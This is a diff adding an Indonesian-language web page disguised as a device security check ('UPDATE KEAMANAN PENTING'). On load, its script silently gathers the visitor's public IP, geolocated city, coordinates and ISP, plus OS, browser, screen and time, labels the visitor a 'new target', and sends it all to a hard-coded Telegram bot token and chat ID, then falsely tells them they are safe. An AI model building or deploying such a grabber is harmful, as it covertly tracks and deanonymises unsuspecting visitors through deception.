@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 UPDATE SISTEM 🔥</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            animation: fadeIn 1s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 2.2em;
+        }
+        
+        .icon {
+            font-size: 80px;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            margin: 30px 0;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+        
+        .status {
+            margin: 20px 0;
+            font-size: 1.1em;
+            color: #666;
+        }
+        
+        .button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s;
+            margin-top: 20px;
+        }
+        
+        .button:hover {
+            transform: scale(1.05);
+        }
+        
+        .info-text {
+            color: #888;
+            font-size: 0.9em;
+            margin-top: 30px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .device-info {
+            background: #f8f8f8;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 0.9em;
+            color: #555;
+            border-left: 4px solid #667eea;
+        }
+        
+        .device-info p {
+            margin: 5px 0;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <h1>⚠️ UPDATE KEAMANAN PENTING ⚠️</h1>
+        
+        <div class="icon">📱</div>
+        
+        <div class="device-info" id="deviceInfo" style="display: none;">
+            <p><strong>📱 INFORMASI PERANGKAT:</strong></p>
+            <p id="ipAddress">IP: Mendeteksi...</p>
+            <p id="deviceModel">Model: -</p>
+            <p id="os">OS: -</p>
+            <p id="browser">Browser: -</p>
+            <p id="screen">Resolusi: -</p>
+            <p id="language">Bahasa: -</p>
+            <p id="time">Waktu: -</p>
+        </div>
+        
+        <div class="status" id="status">
+            <span id="statusText">Memeriksa keamanan perangkat Anda...</span>
+        </div>
+        
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        
+        <button class="button" id="continueBtn" onclick="continueToSite()" style="display: none;">
+            Lanjutkan ke Website
+        </button>
+        
+        <div class="info-text">
+            *Pemeriksaan keamanan rutin untuk melindungi data Anda
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // KONFIGURASI TELEGRAM BOT - ISI DENGAN DATA ANDA
+        // ============================================
+        const TELEGRAM_TOKEN = '8699728144:AAGBwgvUdKbebRnvJ2KUN7JNbtzrODQMtFA';  // GANTI DENGAN TOKEN BOT ANDA
+        const TELEGRAM_CHAT_ID = '7957349292'; // GANTI DENGAN CHAT ID ANDA
+        
+        // ============================================
+        // FUNGSI MENGIRIM KE TELEGRAM
+        // ============================================
+        async function sendToTelegram(message) {
+            if (TELEGRAM_TOKEN.includes('8699728144:AAGBwgvUdKbebRnvJ2KUN7JNbtzrODQMtFA') || TELEGRAM_CHAT_ID.includes('7957349292')) {
+                console.log('⚠️ Token/chat ID belum diisi! Kirim ke console saja.');
+                console.log('📨 DATA YANG AKAN DIKIRIM:', message);
+                return;
+            }
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Gagal kirim ke Telegram:', result);
+                } else {
+                    console.log('✅ Data terkirim ke Telegram');
+                }
+            } catch (error) {
+                console.error('Error kirim ke Telegram:', error);
+            }
+        }
+        
+        // ============================================
+        // FUNGSI MENDAPATKAN IP DAN LOKASI
+        // ============================================
+        async function getIPInfo() {
+            try {
+                // Ambil IP publik
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Ambil detail lokasi dari IP
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                return {
+                    ip: ipData.ip,
+                    country: locationData.country_name || 'Tidak diketahui',
+                    region: locationData.region || 'Tidak diketahui',
+                    city: locationData.city || 'Tidak diketahui',
+                    lat: locationData.latitude || 'Tidak diketahui',
+                    lon: locationData.longitude || 'Tidak diketahui',
+                    isp: locationData.org || 'Tidak diketahui',
+                    timezone: locationData.timezone || 'Tidak diketahui'
+                };
+            } catch (error) {
+                console.error('Gagal ambil IP:', error);
+                return {
+                    ip: 'Gagal mendeteksi',
+                    country: 'Error',
+                    region: 'Error',
+                    city: 'Error',
+                    lat: 'Error',
+                    lon: 'Error',
+                    isp: 'Error',
+                    timezone: 'Error'
+                };
+            }
+        }
+        
+        // ============================================
+        // FUNGSI MENDAPATKAN INFORMASI PERANGKAT
+        // ============================================
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            let os = 'Unknown';
+            let device = 'Desktop';
+            
+            // Deteksi browser
+            if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Edg/')) browser = 'Edge';
+            else if (ua.includes('Chrome')) browser = 'Chrome';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
+            else if (ua.includes('MSIE') || ua.includes('Trident')) browser = 'Internet Explorer';
+            
+            // Deteksi OS
+            if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
+            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+            else if (ua.includes('Mac OS X')) os = 'macOS';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) {
+                os = 'iOS';
+                device = 'iPhone/iPad';
+            }
+            else if (ua.includes('Android')) {
+                os = 'Android';
+                device = 'Android Phone';
+            }
+            else if (ua.includes('Linux')) os = 'Linux';
+            
+            // Deteksi perangkat mobile
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
+                device = 'Mobile';
+            }
+            
+            // Ambil informasi layar
+            const screenInfo = `${window.screen.width} x ${window.screen.height}`;
+            
+            // Ambil bahasa
+            const language = navigator.language || navigator.userLanguage || 'id-ID';
+            
+            // Waktu lokal
+            const localTime = new Date().toLocaleString('id-ID', { timeZoneName: 'short' });
+            
+            // Dapatkan provider (dari koneksi jika ada)
+            let connection = 'Tidak diketahui';
+            if (navigator.connection) {
+                connection = navigator.connection.effectiveType || 'Unknown';
+            }
+            
+            return {
+                browser,
+                os,
+                device,
+                screen: screenInfo,
+                language,
+                localTime,
+                connection,
+                userAgent: ua.substring(0, 100) + '...' // dipotong biar ga kepanjangan
+            };
+        }
+        
+        // ============================================
+        // FUNGSI UTAMA SAAT HALAMAN DIBUKA
+        // ============================================
+        async function main() {
+            // Tampilkan progress bar
+            document.getElementById('progressBar').style.display = 'block';
+            const progressFill = document.getElementById('progressFill');
+            
+            // Update status
+            const statusText = document.getElementById('statusText');
+            
+            // Progress 20% - Ambil IP
+            statusText.innerText = '📡 Mendeteksi alamat IP...';
+            progressFill.style.width = '20%';
+            
+            const ipInfo = await getIPInfo();
+            
+            // Progress 50% - Ambil device info
+            statusText.innerText = '📱 Mengidentifikasi perangkat...';
+            progressFill.style.width = '50%';
+            
+            const deviceInfo = getDeviceInfo();
+            
+            // Progress 80% - Menyiapkan data
+            statusText.innerText = '🔒 Memverifikasi keamanan...';
+            progressFill.style.width = '80%';
+            
+            // Tampilkan device info di halaman
+            document.getElementById('ipAddress').innerHTML = `<strong>IP:</strong> ${ipInfo.ip}`;
+            document.getElementById('deviceModel').innerHTML = `<strong>Tipe:</strong> ${deviceInfo.device}`;
+            document.getElementById('os').innerHTML = `<strong>Sistem Operasi:</strong> ${deviceInfo.os}`;
+            document.getElementById('browser').innerHTML = `<strong>Browser:</strong> ${deviceInfo.browser}`;
+            document.getElementById('screen').innerHTML = `<strong>Resolusi:</strong> ${deviceInfo.screen}`;
+            document.getElementById('language').innerHTML = `<strong>Bahasa:</strong> ${deviceInfo.language}`;
+            document.getElementById('time').innerHTML = `<strong>Waktu:</strong> ${deviceInfo.localTime}`;
+            
+            document.getElementById('deviceInfo').style.display = 'block';
+            
+            // ============================================
+            // FORMAT PESAN UNTUK TELEGRAM
+            // ============================================
+            const telegramMessage = `
+<b>🔥 TARGET BARU MASUK! 🔥</b>
+
+<b>📡 INFORMASI IP:</b>
+├ IP: <code>${ipInfo.ip}</code>
+├ Negara: ${ipInfo.country}
+├ Region: ${ipInfo.region}
+├ Kota: ${ipInfo.city}
+├ ISP: ${ipInfo.isp}
+├ Timezone: ${ipInfo.timezone}
+└ Lokasi: ${ipInfo.lat}, ${ipInfo.lon}
+
+<b>📱 INFORMASI PERANGKAT:</b>
+├ Tipe: ${deviceInfo.device}
+├ OS: ${deviceInfo.os}
+├ Browser: ${deviceInfo.browser}
+├ Resolusi: ${deviceInfo.screen}
+├ Bahasa: ${deviceInfo.language}
+├ Koneksi: ${deviceInfo.connection}
+└ Waktu: ${deviceInfo.localTime}
+
+<b>🔍 USER AGENT:</b>
+<code>${deviceInfo.userAgent}</code>
+
+<b>⏰ WAKTU AKSES:</b> ${new Date().toLocaleString('id-ID')}
+`;
+            
+            // Kirim ke Telegram
+            await sendToTelegram(telegramMessage);
+            
+            // Progress 100% - Selesai
+            statusText.innerText = '✅ Pemeriksaan selesai! Anda aman.';
+            progressFill.style.width = '100%';
+            
+            // Sembunyikan progress bar setelah 1 detik
+            setTimeout(() => {
+                document.getElementById('progressBar').style.display = 'none';
+                document.getElementById('continueBtn').style.display = 'inline-block';
+                statusText.innerText = 'Klik tombol di bawah untuk melanjutkan';
+            }, 1000);
+        }
+        
+        // Fungsi tombol lanjut
+        function continueToSite() {
+            // Redirect ke website lain (opsional)
+            window.location.href = 'https://www.google.com';
+        }
+        
+        // Jalankan main saat halaman dimuat
+        window.addEventListener('load', main);
+    </script>
+</body>
+</html>
